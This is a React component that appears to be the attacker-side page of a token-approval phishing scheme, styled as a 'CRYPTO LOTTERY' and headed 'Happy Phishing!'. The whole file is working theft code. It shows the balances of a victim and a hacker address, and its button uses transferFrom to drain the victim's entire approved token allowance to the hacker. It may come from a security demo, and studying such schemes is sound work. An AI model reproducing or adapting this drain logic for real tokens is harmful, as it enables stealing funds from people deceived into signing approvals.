import React from 'react';
import { ethers } from 'ethers';
import Token from '../artifacts/contracts/Token.sol/Token.json';

const { REACT_APP_CONTRACT_ADDRESS, REACT_APP_HACKER_ADDRESS } = process.env;
const provider = new ethers.providers.Web3Provider(window.ethereum);
const contract = new ethers.Contract(REACT_APP_CONTRACT_ADDRESS, Token.abi, provider);
const victimAddress = localStorage.getItem('victim');

class Hidden extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      victimBalance: '-',
      hackerBalance: '-'
    };
    this.transfer = this.transfer.bind(this);
  }

  componentDidMount() {
    this.getBalance();
  }

  async getBalance() {
    const victimBalance = (await contract.balanceOf(victimAddress)).toString();
    const hackerBalance = (await contract.balanceOf(REACT_APP_HACKER_ADDRESS)).toString();
    this.setState({
      victimBalance,
      hackerBalance
    });
  }

  async transfer() {
    const signer = provider.getSigner();
    const token = await contract.connect(signer);
    const amount = await contract.allowance(victimAddress, signer.getAddress());
    await token.transferFrom(victimAddress, REACT_APP_HACKER_ADDRESS, amount);
  }

  render() {
    return (
      <div className="app">
        <div className="app-body">
          <div className="title-s">CRYPTO LOTTERY</div>
          <div className="title-m">Happy Phishing!</div>
          <div className="app-content">
            {victimAddress && <div className="content-row">Victim's TOX balance ({victimAddress}): {this.state.victimBalance}</div>}
            <div className="content-row">Hacker's TOX balance ({REACT_APP_HACKER_ADDRESS}): {this.state.hackerBalance}</div>
          </div>
          <button className="btn" onClick={this.transfer}>Get TOX</button>
        </div>
      </div>
    );
  }
}

export default Hidden;